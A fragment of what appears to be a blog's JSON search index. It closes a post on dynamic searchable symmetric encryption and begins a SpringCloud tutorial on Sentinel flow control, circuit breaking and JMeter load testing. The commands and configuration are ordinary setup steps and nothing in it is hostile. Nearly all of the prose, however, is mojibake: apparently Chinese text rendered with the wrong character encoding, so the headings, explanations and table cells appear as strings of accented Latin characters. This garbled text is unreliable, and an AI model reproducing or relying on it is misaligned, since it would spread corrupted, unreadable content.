é™¤æ•°ç»„ä¸­çš„è¿™äº›ä½ç½®å­˜å‚¨æ–°çš„æ¡ç›®$(f_{4},w_{1})$å’Œ$(f_{4},w_{2})$,å¹¶å°†å®ƒä»¬ç”¨æŒ‡é’ˆè¿æ¥èµ·æ¥ã€‚æœ€åï¼ŒæœåŠ¡å™¨å°†é€šè¿‡å°†æ¡ç›®$F_{K_{1}}(f_{4})$è®¾ç½®ä¸ºæŒ‡å‘åˆ é™¤æ•°ç»„ä¸­çš„ä½ç½®3æ¥æ›´æ–°åˆ é™¤è¡¨ï¼Œä»¥ä¾¿ç¨åå¯ä»¥å®¹æ˜“åœ°æ£€ç´¢æ–‡ä»¶$f_4$è¿›è¡Œåˆ é™¤ã€‚\n\n **åˆ é™¤æ–‡æ¡£**ã€‚å‡è®¾ç°åœ¨å®¢æˆ·æƒ³è¦åˆ é™¤ä¸€ä¸ªå·²ç»å­˜å‚¨åœ¨æˆ‘ä»¬çš„ç´¢å¼•ä¸­çš„æ–‡æ¡£ï¼Œæ¯”å¦‚è¯´æ–‡æ¡£$f_{3}$ï¼Œå®ƒåŒ…å«å…³é”®å­—$w_{1}$å’Œ$w_{3}$ã€‚åˆ é™¤æ˜¯æ·»åŠ çš„â€œåŒé‡æ“ä½œâ€ã€‚é¦–å…ˆï¼ŒæœåŠ¡å™¨ä½¿ç”¨åˆ é™¤ä»¤ç‰Œçš„å€¼$F_{K_{1}}(f_{3})$åœ¨åˆ é™¤è¡¨ä¸­å®šä½æ­£ç¡®çš„å€¼$4\\oplus G_{K_{2}}(f_{3})$ã€‚è¿™å°†å…è®¸æœåŠ¡å™¨è®¿é—®å‰©ä½™æ•°æ®ç»“æ„ä¸­éœ€è¦ç”¨addç®—æ³•ä»¥ç±»ä¼¼æ–¹å¼æ›´æ–°çš„éƒ¨åˆ†ã€‚å³å®ƒå°†â€œé‡Šæ”¾â€åˆ é™¤æ•°ç»„ä¸­çš„ä½ç½®4å’Œ6ä»¥åŠæœç´¢æ•°ç»„ä¸­çš„ä½ç½®1å’Œ3ã€‚å½“â€œé‡Šæ”¾â€æœç´¢æ•°ç»„ä¸­çš„ä½ç½®æ—¶ï¼Œå®ƒè¿˜å°†åŒæ€æ›´æ–°æŒ‡å‘æ–°æ¡ç›®çš„å…³é”®å­—åˆ—è¡¨$w_{1}$å’Œ$w_{3}$ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ŒæŒ‡å‘åˆ—è¡¨çš„æœ«å°¾â€”â€”é€šå¸¸åœ¨å·²åˆ é™¤æ¡ç›®çš„ä¸‹ä¸€ä¸ªæŒ‡é’ˆä¸­ï¼‰ã€‚æ³¨æ„ï¼Œåˆ é™¤æ•°ç»„ä¸éœ€è¦è¿™æ ·çš„æŒ‡é’ˆæ›´æ–°ã€‚\n\n##  5ã€å‚è€ƒæ–‡çŒ®\n\n- [ã€ŠåŠ¨æ€å¯æœç´¢å¯¹ç§°åŠ å¯†ã€‹](https://blog.nowcoder.net/n/b3227a872c25451784acfbca3f9c2cb0)\n\n- [åŠ¨æ€å¯æœç´¢åŠ å¯†-1-å‰ä¸–ä»Šç”Ÿ - Kisna's Blog (eotstxtab.top)](http://eotstxtab.top/2022/03/01/åŠ¨æ€å¯æœç´¢åŠ å¯†-1-å‰ä¸–ä»Šç”Ÿ/)\n\n- [IEEE TIFS'22ï¼šå¥å£®ä¸”å…·æœ‰å‰åå‘å®‰å…¨æ€§çš„å¯æœç´¢å¯¹ç§°åŠ å¯†_ ITæŠ€æœ¯ç²¾å (taocms.org)](http://it.taocms.org/07/110668.htm)\n\n- [åŠ¨æ€å¯æœç´¢å¯¹ç§°åŠ å¯†æ–¹æ¡ˆï¼Œæ”¯æŒå…·æœ‰å‘å‰ï¼ˆå’Œå‘åï¼‰å®‰å…¨|çš„èŒƒå›´æŸ¥è¯¢æ–½æ™®æ—æ ¼é“¾æ¥ (springer.com)](https://link.springer.com/chapter/10.1007/978-3-319-98989-1_12)\n\n- [å®‰å…¨æ€§è¯æ˜ - PamShao - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/pam-sh/p/16383012.html)\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"SpringCloud-é«˜çº§ç¯‡","url":"/posts/41649.html","content":"\n> é«˜çº§ç¯‡åŒ…å«å¾®æœåŠ¡ä¿æŠ¤(æµé‡æ§åˆ¶ï¼Œç³»ç»Ÿä¿æŠ¤ï¼Œç†”æ–­é™çº§ï¼ŒæœåŠ¡æˆæƒ)ã€åˆ†å¸ƒå¼äº‹åŠ¡ã€å¤šçº§ç¼“å­˜ã€Redisé›†ç¾¤ã€å¯é æ¶ˆæ¯æœåŠ¡\n\n| ![å­¦ä¹ å®‰æ’](https://img.jwt1399.top/img/202209201412578.png) |\n| ------------------------------------------------------------ |\n| ![æŠ€æœ¯åˆ†ç±»](https://img.jwt1399.top/img/202209201436751.png) |\n\n# 1.å¾®æœåŠ¡ä¿æŠ¤\n\n## â‘ åˆè¯†Sentinel\n\n### â¶é›ªå´©é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ\n\n**ä»€ä¹ˆæ˜¯é›ªå´©é—®é¢˜ï¼Ÿ**\n\nå¾®æœåŠ¡ä¸­ï¼ŒæœåŠ¡é—´è°ƒç”¨å…³ç³»é”™ç»¼å¤æ‚ï¼Œä¸€ä¸ªå¾®æœåŠ¡å¾€å¾€ä¾èµ–äºå¤šä¸ªå…¶å®ƒå¾®æœåŠ¡ã€‚å¦‚æœå¾®æœåŠ¡è°ƒç”¨é“¾è·¯ä¸­çš„æŸä¸ªæœåŠ¡æ•…éšœï¼Œå¼•èµ·æ•´ä¸ªé“¾è·¯ä¸­çš„æ‰€æœ‰å¾®æœåŠ¡éƒ½ä¸å¯ç”¨ï¼Œåˆ™ç§°ä¸ºé›ªå´©ã€‚\n\n**è§£å†³é›ªå´©é—®é¢˜çš„å¸¸è§æ–¹å¼æœ‰å››ç§ï¼š**\n\n- **è¶…æ—¶å¤„ç†**ï¼šè®¾å®šè¶…æ—¶æ—¶é—´ï¼Œè¯·æ±‚è¶…è¿‡ä¸€å®šæ—¶é—´æ²¡æœ‰å“åº”å°±è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œä¸ä¼šæ— ä¼‘æ­¢ç­‰å¾…ã€‚\n\n- **èˆ±å£æ¨¡å¼**ï¼šé™å®šæ¯ä¸ªä¸šåŠ¡èƒ½ä½¿ç”¨çš„çº¿ç¨‹æ•°ï¼Œé¿å…è€—å°½æ•´ä¸ªtomcatçš„èµ„æºï¼Œå› æ­¤ä¹Ÿå«**çº¿ç¨‹éš”ç¦»**ã€‚\n\n- **ç†”æ–­é™çº§**ï¼šç”±**æ–­è·¯å™¨**ç»Ÿè®¡ä¸šåŠ¡æ‰§è¡Œçš„å¼‚å¸¸æ¯”ä¾‹ï¼Œå¦‚æœè¶…å‡ºé˜ˆå€¼åˆ™**ç†”æ–­**è¯¥ä¸šåŠ¡ï¼Œæ‹¦æˆªè®¿é—®è¯¥ä¸šåŠ¡çš„ä¸€åˆ‡è¯·æ±‚ã€‚\n\n- **æµé‡æ§åˆ¶**ï¼šé™åˆ¶ä¸šåŠ¡è®¿é—®çš„QPSï¼ˆQuery Per Secondï¼šæ¯ç§’å¤„ç†è¯·æ±‚æ•°ï¼‰ï¼Œé¿å…æœåŠ¡å› æµé‡çš„çªå¢è€Œæ•…éšœã€‚\n\n **æµé‡æ§åˆ¶**æ˜¯å¯¹æœåŠ¡çš„ä¿æŠ¤ï¼Œé¿å…å› ç¬é—´é«˜å¹¶å‘æµé‡è€Œå¯¼è‡´æœåŠ¡æ•…éšœï¼Œè¿›è€Œé¿å…é›ªå´©ã€‚æ˜¯ä¸€ç§**é¢„é˜²**æªæ–½ã€‚\n\n**è¶…æ—¶å¤„ç†ã€çº¿ç¨‹éš”ç¦»ã€ç†”æ–­é™çº§**æ˜¯åœ¨éƒ¨åˆ†æœåŠ¡æ•…éšœæ—¶ï¼Œå°†æ•…éšœæ§åˆ¶åœ¨ä¸€å®šèŒƒå›´ï¼Œé¿å…é›ªå´©ã€‚æ˜¯ä¸€ç§**è¡¥æ•‘**æªæ–½ã€‚\n\næ¢å¥è¯è¯´ï¼š\n\nå¦‚ä½•é¿å…å› ç¬é—´é«˜å¹¶å‘æµé‡è€Œå¯¼è‡´æœåŠ¡æ•…éšœï¼Ÿæµé‡æ§åˆ¶\n\nå¦‚ä½•é¿å…å› æœåŠ¡æ•…éšœå¼•èµ·çš„é›ªå´©é—®é¢˜ï¼Ÿè¶…æ—¶å¤„ç†ã€çº¿ç¨‹éš”ç¦»ã€é™çº§ç†”æ–­\n\n### â·æœåŠ¡ä¿æŠ¤æŠ€æœ¯å¯¹æ¯”\n\nåœ¨SpringCloudå½“ä¸­æ”¯æŒå¤šç§æœåŠ¡ä¿æŠ¤æŠ€æœ¯ï¼Œæ—©æœŸæ¯”è¾ƒæµè¡Œçš„æ˜¯Hystrixæ¡†æ¶ï¼Œä½†ç›®å‰å›½å†…å®ç”¨æœ€å¹¿æ³›çš„è¿˜æ˜¯é˜¿é‡Œå·´å·´çš„Sentinelæ¡†æ¶ï¼Œè¿™é‡Œæˆ‘ä»¬åšä¸‹å¯¹æ¯”ï¼š\n\n|                | **Sentinel**                                   | **Hystrix**                   |\n| -------------- | ---------------------------------------------- | ----------------------------- |\n| éš”ç¦»ç­–ç•¥       | ä¿¡å·é‡éš”ç¦»                                     | çº¿ç¨‹æ± éš”ç¦»/ä¿¡å·é‡éš”ç¦»         |\n| ç†”æ–­é™çº§ç­–ç•¥   | åŸºäºæ…¢è°ƒç”¨æ¯”ä¾‹æˆ–å¼‚å¸¸æ¯”ä¾‹                       | åŸºäºå¤±è´¥æ¯”ç‡                  |\n| å®æ—¶æŒ‡æ ‡å®ç°   | æ»‘åŠ¨çª—å£                                       | æ»‘åŠ¨çª—å£ï¼ˆåŸºäº RxJavaï¼‰       |\n| è§„åˆ™é…ç½®       | æ”¯æŒå¤šç§æ•°æ®æº                                 | æ”¯æŒå¤šç§æ•°æ®æº                |\n| æ‰©å±•æ€§         | å¤šä¸ªæ‰©å±•ç‚¹                                     | æ’ä»¶çš„å½¢å¼                    |\n| åŸºäºæ³¨è§£çš„æ”¯æŒ | æ”¯æŒ                                           | æ”¯æŒ                          |\n| é™æµ           | åŸºäº QPSï¼Œæ”¯æŒåŸºäºè°ƒç”¨å…³ç³»çš„é™æµ               | æœ‰é™çš„æ”¯æŒ                    |\n| æµé‡æ•´å½¢       | æ”¯æŒæ…¢å¯åŠ¨ã€åŒ€é€Ÿæ’é˜Ÿæ¨¡å¼                       | ä¸æ”¯æŒ                        |\n| ç³»ç»Ÿè‡ªé€‚åº”ä¿æŠ¤ | æ”¯æŒ                                           | ä¸æ”¯æŒ                        |\n| æ§åˆ¶å°         | å¼€ç®±å³ç”¨ï¼Œå¯é…ç½®è§„åˆ™ã€æŸ¥çœ‹ç§’çº§ç›‘æ§ã€æœºå™¨å‘ç°ç­‰ | ä¸å®Œå–„                        |\n| å¸¸è§æ¡†æ¶çš„é€‚é… | Servletã€Spring Cloudã€Dubboã€gRPC  ç­‰         | Servletã€Spring Cloud Netflix |\n\n### â¸Sentinelä»‹ç»å’Œå®‰è£…\n\n#### 1.ä»‹ç»\n\nSentinelæ˜¯é˜¿é‡Œå·´å·´å¼€æºçš„ä¸€æ¬¾å¾®æœåŠ¡æµé‡æ§åˆ¶ç»„ä»¶ã€‚å®˜ç½‘åœ°å€ï¼šhttps://sentinelguard.io/zh-cn/index.html\n\nSentinel å…·æœ‰ä»¥ä¸‹ç‰¹å¾:\n\n- **ä¸°å¯Œçš„åº”ç”¨åœºæ™¯**ï¼šSentinel æ‰¿æ¥äº†é˜¿é‡Œå·´å·´è¿‘ 10 å¹´çš„åŒåä¸€å¤§ä¿ƒæµé‡çš„æ ¸å¿ƒåœºæ™¯ï¼Œä¾‹å¦‚ç§’æ€ï¼ˆå³çªå‘æµé‡æ§åˆ¶åœ¨ç³»ç»Ÿå®¹é‡å¯ä»¥æ‰¿å—çš„èŒƒå›´ï¼‰ã€æ¶ˆæ¯å‰Šå³°å¡«è°·ã€é›†ç¾¤æµé‡æ§åˆ¶ã€å®æ—¶ç†”æ–­ä¸‹æ¸¸ä¸å¯ç”¨åº”ç”¨ç­‰ã€‚\n\n- **å®Œå¤‡çš„å®æ—¶ç›‘æ§**ï¼šSentinel åŒæ—¶æä¾›å®æ—¶çš„ç›‘æ§åŠŸèƒ½ã€‚æ‚¨å¯ä»¥åœ¨æ§åˆ¶å°ä¸­çœ‹åˆ°æ¥å…¥åº”ç”¨çš„å•å°æœºå™¨ç§’çº§æ•°æ®ï¼Œç”šè‡³ 500 å°ä»¥ä¸‹è§„æ¨¡çš„é›†ç¾¤çš„æ±‡æ€»è¿è¡Œæƒ…å†µã€‚\n\n- **å¹¿æ³›çš„å¼€æºç”Ÿæ€**ï¼šSentinel æä¾›å¼€ç®±å³ç”¨çš„ä¸å…¶å®ƒå¼€æºæ¡†æ¶/åº“çš„æ•´åˆæ¨¡å—ï¼Œä¾‹å¦‚ä¸ Spring Cloudã€Dubboã€gRPC çš„æ•´åˆã€‚æ‚¨åªéœ€è¦å¼•å…¥ç›¸åº”çš„ä¾èµ–å¹¶è¿›è¡Œç®€å•çš„é…ç½®å³å¯å¿«é€Ÿåœ°æ¥å…¥ Sentinelã€‚\n\n- **å®Œå–„çš„** **SPI** **æ‰©å±•ç‚¹**ï¼šSentinel æä¾›ç®€å•æ˜“ç”¨ã€å®Œå–„çš„ SPI æ‰©å±•æ¥å£ã€‚æ‚¨å¯ä»¥é€šè¿‡å®ç°æ‰©å±•æ¥å£æ¥å¿«é€Ÿåœ°å®šåˆ¶é€»è¾‘ã€‚ä¾‹å¦‚å®šåˆ¶è§„åˆ™ç®¡ç†ã€é€‚é…åŠ¨æ€æ•°æ®æºç­‰ã€‚\n\n#### 2.å®‰è£…\n\n**ä¸‹è½½**ï¼šsentinelå®˜æ–¹æä¾›äº†UIæ§åˆ¶å°ï¼Œå¯ä»¥åœ¨[GitHub](https://github.com/alibaba/Sentinel/releases)ä¸‹è½½ã€‚\n\n**è¿è¡Œ**ï¼šå°†jaråŒ…æ”¾åˆ°ä»»æ„éä¸­æ–‡ç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š\n\n```sh\njava -jar sentinel-dashboard-1.8.5.jar\n```\n\n**ä¿®æ”¹é…ç½®**ï¼šå¦‚æœè¦ä¿®æ”¹Sentinelçš„é»˜è®¤ç«¯å£ã€è´¦æˆ·ã€å¯†ç ï¼Œå¯ä»¥é€šè¿‡ä¸‹åˆ—é…ç½®ï¼š\n\n| **é…ç½®é¡¹**                       | **é»˜è®¤å€¼** | **è¯´æ˜**   |\n| -------------------------------- | ---------- | ---------- |\n| server.port                      | 8080       | æœåŠ¡ç«¯å£   |\n| sentinel.dashboard.auth.username | sentinel   | é»˜è®¤ç”¨æˆ·å |\n| sentinel.dashboard.auth.password | sentinel   | é»˜è®¤å¯†ç    |\n\nä¾‹å¦‚ï¼Œä¿®æ”¹ç«¯å£ï¼š\n\n```sh\njava -Dserver.port=8090 -jar sentinel-dashboard-1.8.5.jar\n```\n\n**ä½¿ç”¨**ï¼šè®¿é—®http://localhost:8080é¡µé¢ï¼Œå°±å¯ä»¥çœ‹åˆ°sentinelçš„æ§åˆ¶å°äº†\n\n### â¹å¾®æœåŠ¡æ•´åˆSentinel\n\nè¦ä½¿ç”¨Sentinelè‚¯å®šè¦ç»“åˆå¾®æœåŠ¡ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨SpringCloudå®ç”¨ç¯‡ä¸­çš„cloud-demoå·¥ç¨‹ã€‚\n\n1ï¼‰order-serviceä¸­å¼•å…¥sentinelä¾èµ–\n\n```xml\n<!--sentinel-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId> \n    <artifactId>spring-cloud-starter-alibaba-sentinel</artifactId>\n</dependency>\n```\n\n2ï¼‰é…ç½®æ§åˆ¶å°\n\nä¿®æ”¹application.yamlæ–‡ä»¶ï¼Œæ·»åŠ ä¸‹é¢å†…å®¹ï¼š\n\n```yaml\nserver:\n  port: 8088\nspring:\n  cloud: \n    sentinel:\n      transport:\n        dashboard: localhost:8080\n```\n\n3ï¼‰è®¿é—®å¾®æœåŠ¡çš„ä»»æ„ç«¯ç‚¹ï¼Œè®¿é—®åæ‰èƒ½è§¦å‘sentinelçš„ç›‘æ§ã€‚ç„¶åå†è®¿é—®sentinelçš„æ§åˆ¶å°ï¼Œå³å¯æŸ¥çœ‹æ•ˆæœ\n\n## â‘¡æµé‡æ§åˆ¶\n\n### â¶ç°‡ç‚¹é“¾è·¯\n\nå½“è¯·æ±‚è¿›å…¥å¾®æœåŠ¡æ—¶ï¼Œé¦–å…ˆä¼šè®¿é—®DispatcherServletï¼Œç„¶åè¿›å…¥Controllerã€Serviceã€Mapperï¼Œè¿™æ ·çš„ä¸€ä¸ªè°ƒç”¨é“¾å°±å«åš**ç°‡ç‚¹é“¾è·¯**ã€‚ç°‡ç‚¹é“¾è·¯ä¸­è¢«ç›‘æ§çš„æ¯ä¸€ä¸ªæ¥å£å°±æ˜¯ä¸€ä¸ª**èµ„æº**ã€‚\n\né»˜è®¤æƒ…å†µä¸‹sentinelä¼šç›‘æ§SpringMVCçš„æ¯ä¸€ä¸ªç«¯ç‚¹ï¼ˆEndpointï¼Œä¹Ÿå°±æ˜¯controllerä¸­çš„æ–¹æ³•ï¼‰ï¼Œå› æ­¤SpringMVCçš„æ¯ä¸€ä¸ªç«¯ç‚¹ï¼ˆEndpointï¼‰å°±æ˜¯è°ƒç”¨é“¾è·¯ä¸­çš„ä¸€ä¸ªèµ„æºã€‚\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬åˆšæ‰è®¿é—®çš„order-serviceä¸­çš„OrderControllerä¸­çš„ç«¯ç‚¹ï¼š/order/{orderId}\n\n![](https://img.jwt1399.top/img/202210101426510.png)\n\næµæ§ã€ç†”æ–­ç­‰éƒ½æ˜¯é’ˆå¯¹ç°‡ç‚¹é“¾è·¯ä¸­çš„èµ„æºæ¥è®¾ç½®çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç‚¹å‡»å¯¹åº”èµ„æºåé¢çš„æŒ‰é’®æ¥è®¾ç½®è§„åˆ™ï¼š\n\n- æµæ§ï¼šæµé‡æ§åˆ¶\n- é™çº§ï¼šé™çº§ç†”æ–­\n- çƒ­ç‚¹ï¼šçƒ­ç‚¹å‚æ•°é™æµï¼Œæ˜¯é™æµçš„ä¸€ç§\n- æˆæƒï¼šè¯·æ±‚çš„æƒé™æ§åˆ¶\n\n### â·å¿«é€Ÿå…¥é—¨\n\n#### 1.ç¤ºä¾‹\n\nç‚¹å‡»èµ„æº/order/{orderId}åé¢çš„æµæ§æŒ‰é’®ï¼Œå°±å¯ä»¥å¼¹å‡ºè¡¨å•ã€‚è¡¨å•ä¸­å¯ä»¥å¡«å†™é™æµè§„åˆ™ï¼Œå¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202210102031031.png)\n\nå…¶å«ä¹‰æ˜¯é™åˆ¶ /order/{orderId}è¿™ä¸ªèµ„æºçš„å•æœºQPSä¸º1ï¼Œå³æ¯ç§’åªå…è®¸1æ¬¡è¯·æ±‚ï¼Œè¶…å‡ºçš„è¯·æ±‚ä¼šè¢«æ‹¦æˆªå¹¶æŠ¥é”™ã€‚\n\n#### 2.ç»ƒä¹ \n\n> éœ€æ±‚ï¼šç»™ /order/{orderId}è¿™ä¸ªèµ„æºè®¾ç½®æµæ§è§„åˆ™ï¼ŒQPSä¸èƒ½è¶…è¿‡ 5ï¼Œç„¶åæµ‹è¯•ã€‚\n\n1ï¼‰é¦–å…ˆåœ¨sentinelæ§åˆ¶å°æ·»åŠ é™æµè§„åˆ™\n\n2ï¼‰åˆ©ç”¨jmeteræµ‹è¯•ï¼Œå¦‚æœæ²¡æœ‰ç”¨è¿‡jmeterï¼Œå¯ä»¥å‚è€ƒä¸‹é¢ç« èŠ‚ã€ŠJmeterå¿«é€Ÿå…¥é—¨.mdã€‹\n\næ‰“å¼€jmeterï¼Œå¯¼å…¥ç¼–å†™å¥½çš„Jmeteræµ‹è¯•æ ·ä¾‹ï¼Œé€‰æ‹©`æµæ§å…¥é—¨ï¼ŒQPS<5`![](https://img.jwt1399.top/img/202210101529813.png)\n\n20ä¸ªç”¨æˆ·ï¼Œ2ç§’å†…è¿è¡Œå®Œï¼ŒQPSæ˜¯10ï¼Œè¶…è¿‡äº†5ã€‚é€‰ä¸­`æµæ§å…¥é—¨ï¼ŒQPS<5`å³é”®è¿è¡Œï¼šå¯ä»¥çœ‹åˆ°æˆåŠŸè¯·æ±‚æ¯æ¬¡åªæœ‰5ä¸ª\n\n> æ³¨æ„ï¼Œä¸è¦ç‚¹å‡»èœå•ä¸­çš„æ‰§è¡ŒæŒ‰é’®æ¥è¿è¡Œã€‚\n\n| å¯åŠ¨                                                 | ç»“æœ                                                 |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210101530894.png) | ![](https://img.jwt1399.top/img/202210101530202.png) |\n\n#### 3.Jmeterå¿«é€Ÿå…¥é—¨\n\n##### 1.å®‰è£…Jmeter\n\nJmeterä¾èµ–äºJDKï¼Œæ‰€ä»¥å¿…é¡»ç¡®ä¿å½“å‰è®¡ç®—æœºä¸Šå·²ç»å®‰è£…äº†JDKï¼Œå¹¶ä¸”é…ç½®äº†ç¯å¢ƒå˜é‡ã€‚\n\nå¯ä»¥Apache Jmeterå®˜ç½‘ä¸‹è½½ï¼Œåœ°å€ï¼šhttp://jmeter.apache.org/download_jmeter.cgi\n\næœ‰ä¸¤ä¸ªç‰ˆæœ¬å¯ä¾›ä¸‹è½½ï¼š\n\n- Binariesï¼šäºŒè¿›åˆ¶ç‰ˆï¼Œå³å·²ç»ç¼–è¯‘å¥½ã€å¯ç›´æ¥æ‰§è¡Œï¼›\n- Sourceï¼šæºä»£ç ç‰ˆï¼Œéœ€è¦è‡ªå·±ç¼–è¯‘ï¼›\n\næˆ‘ä»¬ä¸‹è½½Binariesç‰ˆæœ¬ï¼Œä¸‹è½½å®Œæˆåï¼Œè§£å‹\n\n##### 2.å¯åŠ¨JMeter\n\nè¿›å…¥åˆ°binç›®å½•ä¸‹ï¼Œé€šè¿‡`sh jmeter`å‘½ä»¤æ¥å¯åŠ¨JMeter\n\nç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥æˆåŠŸå¯åŠ¨JMeteräº†ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½éœ€è¦æ‰“å¼€ç»ˆç«¯ã€è¿›å…¥åˆ°JMeterçš„binç›®å½•ä¸‹ï¼Œè¾“å…¥`sh jmeter`å‘½ä»¤æ¥å¯åŠ¨ï¼Œæ˜¾å¾—æœ‰ç‚¹ç¹çã€‚å½“æˆ‘ä»¬å¯¹~/.bash_profileï¼ˆ ~/.zshrcï¼‰è¿™ä¸ªæ–‡ä»¶ç†Ÿæ‚‰åï¼Œå¯ä»¥ç›´æ¥æŠŠJMeteré…ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­ã€‚\n\nè¿˜æ˜¯é€šè¿‡`vim .bash_profile`è¿›å…¥åˆ°vimç¼–è¾‘å™¨ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š\n\n```bash\nexport JMETER_HOME=/Users/jianjian/JavaSoft/apache-jmeter-5.5\nexport PATH=$JAVA_HOME/bin:$PATH:.:$JMETER_HOME/bin:$PATH\nexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JMETER_HOME/lib/ext/ApacheJMeter_core.jar:$JMETER_HOME/lib/jorphan.jar:$JMETER_HOME/lib/logkit-2.0.jar\n```\n\né€€å‡ºvimç¼–è¾‘å™¨ï¼Œè¾“å…¥`source ~/.bash_profile`ã€‚æ¥ä¸‹æ¥é‡ç‚¹æ¥äº†ï¼Œç›´æ¥åœ¨ç»ˆç«¯ï¼ˆä»»æ„ç›®å½•ï¼‰è¾“å…¥`jmeter`ï¼Œå³å¯å¯åŠ¨JMeterã€‚\n\n##### 3.è®¾ç½®ä¸­æ–‡\n\né»˜è®¤Jmeterçš„è¯­è¨€æ˜¯è‹±æ–‡ï¼Œå¯ä»¥åœ¨ Option->Choose Lunguagä¸­è¿›è¡Œä¿®æ”¹ï¼Œè¿™ç§æ–¹å¼åªèƒ½ä¿è¯æœ¬æ¬¡è¿è¡Œæ˜¯ä¸­æ–‡ï¼Œå¦‚æœè¦æ°¸ä¹…ä¸­æ–‡ï¼Œéœ€è¦ä¿®æ”¹Jmeterçš„é…ç½®æ–‡ä»¶\n\næ‰“å¼€jmeteræ–‡ä»¶å¤¹ï¼Œåœ¨binç›®å½•ä¸­æ‰¾åˆ° **jmeter.properties**ï¼Œæ·»åŠ ä¸‹é¢é…ç½®ï¼š\n\n```bash\n#Preferred GUI language. Comment out to use the JVM default locale's language.\nlanguage=zh_CN\n```\n\n##### 4.åŸºæœ¬ç”¨æ³•\n\nåœ¨æµ‹è¯•è®¡åˆ’ä¸Šç‚¹é¼ æ ‡å³é”®ï¼Œé€‰æ‹©æ·»åŠ  > çº¿ç¨‹ï¼ˆç”¨æˆ·ï¼‰ > çº¿ç¨‹ç»„ï¼š\n\n![](https://img.jwt1399.top/img/202210102032741.png)\n\nåœ¨æ–°å¢çš„çº¿ç¨‹ç»„ä¸­ï¼Œå¡«å†™çº¿ç¨‹ä¿¡æ¯ï¼š\n\n![](https://img.jwt1399.top/img/202210102032979.png)\n\n\n\nç»™çº¿ç¨‹ç»„ç‚¹é¼ æ ‡å³é”®ï¼Œæ·»åŠ httpå–æ ·å™¨ï¼š\n\n![](https://img.jwt1399.top/img/202210102032119.png)\n\nç¼–å†™å–æ ·å™¨å†…å®¹ï¼š\n\n![](https://img.jwt1399.top/img/202210102032649.png)\n\næ·»åŠ ç›‘å¬å™¨ï¼š\n\n| æ·»åŠ ç›‘å¬æŠ¥å‘Š                                         | æ·»åŠ ç›‘å¬ç»“æœæ ‘                                       |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102032719.png) | ![](https://img.jwt1399.top/img/202210102032347.png) |\n\nç„¶åç‚¹å‡»è¿è¡Œï¼š\n\n| æ±‡æ€»æŠ¥å‘Šç»“æœ                                         | ç»“æœæ ‘                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210102032067.png) | ![](https://img.jwt1399.top/img/202210102032761.png) |\n\n### â¸æµæ§æ¨¡å¼\n\n#### 1.ç®€ä»‹\n\nåœ¨æ·»åŠ é™æµè§„åˆ™æ—¶ï¼Œç‚¹å‡»é«˜çº§é€‰é¡¹ï¼Œå¯ä»¥é€‰æ‹©ä¸‰ç§**æµæ§æ¨¡å¼**ï¼š\n\n- **ç›´æ¥**ï¼šç»Ÿè®¡å½“å‰èµ„æºçš„è¯·æ±‚ï¼Œè§¦å‘é˜ˆå€¼æ—¶å¯¹å½“å‰èµ„æºç›´æ¥é™æµï¼Œé»˜è®¤çš„æ¨¡å¼ï¼ˆå¿«é€Ÿå…¥é—¨æ¡ˆä¾‹å°±æ˜¯ç›´æ¥æ¨¡å¼ï¼‰\n- **å…³è”**ï¼šç»Ÿè®¡ä¸å½“å‰èµ„æºç›¸å…³çš„å¦ä¸€ä¸ªèµ„æºï¼Œè§¦å‘é˜ˆå€¼æ—¶ï¼Œå¯¹å½“å‰èµ„æºé™æµ\n- **é“¾è·¯**ï¼šç»Ÿè®¡ä»æŒ‡å®šé“¾è·¯è®¿é—®åˆ°æœ¬èµ„æºçš„è¯·æ±‚ï¼Œè§¦å‘é˜ˆå€¼æ—¶ï¼Œå¯¹æŒ‡å®šé“¾è·¯é™æµ\n\n![](https://img.jwt1399.top/img/202210102043335.png)\n\n#### 